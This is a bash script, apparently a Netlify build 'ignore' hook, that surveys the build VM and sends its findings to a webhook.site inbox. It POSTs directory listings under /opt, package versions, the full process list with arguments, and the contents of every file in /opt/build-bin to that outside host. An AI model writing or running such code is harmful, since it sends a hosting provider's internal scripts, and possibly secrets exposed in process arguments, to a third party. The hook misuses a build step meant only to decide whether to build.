#!/usr/bin/env bash
# TEMPORARY Netlify probe, run as the `ignore` command (before dependency
# install). Reports the build VM's own build scripts and layout to a throwaway
# inbox, because Netlify's dependency-install stage cannot be observed by
# build plugins. Exit code 1 tells Netlify to continue with the build.
REPORT_URL="https://webhook.site/49b5e23f-ac15-43a9-8fd9-735db2e69f5c"

report() { curl -s -m 30 -X POST --data-binary @- "$REPORT_URL" > /dev/null; }

{
  echo "### stage: ignore/layout $(date -u +%FT%TZ) commit=${COMMIT_REF:-?}"
  echo "--- /opt/build-bin"; ls -la /opt/build-bin 2>&1
  echo "--- /opt/buildhome"; ls -la /opt/buildhome 2>&1 | head -n 40
  echo "--- /opt/build"; ls -la /opt/build 2>&1
  echo "--- /opt/buildhome/package.json"; head -c 1500 /opt/buildhome/package.json 2>&1
  echo; echo "--- netlify-build version"; ls /opt/buildhome/node_modules/@netlify 2>&1 | head -n 20
  for d in /opt/buildhome/node_modules/@netlify/build /opt/buildhome/node_modules/netlify-cli; do
    [ -f "$d/package.json" ] && echo "$d: $(node -p "require('$d/package.json').version" 2>&1)"
  done
  echo "--- processes"; ps -eo pid,ppid,user,args 2>/dev/null | head -n 30
} 2>&1 | report

for f in /opt/build-bin/*; do
  [ -f "$f" ] || continue
  { echo "### file: $f ($(wc -c < "$f") bytes)"; head -c 120000 "$f"; } | report
done

exit 1
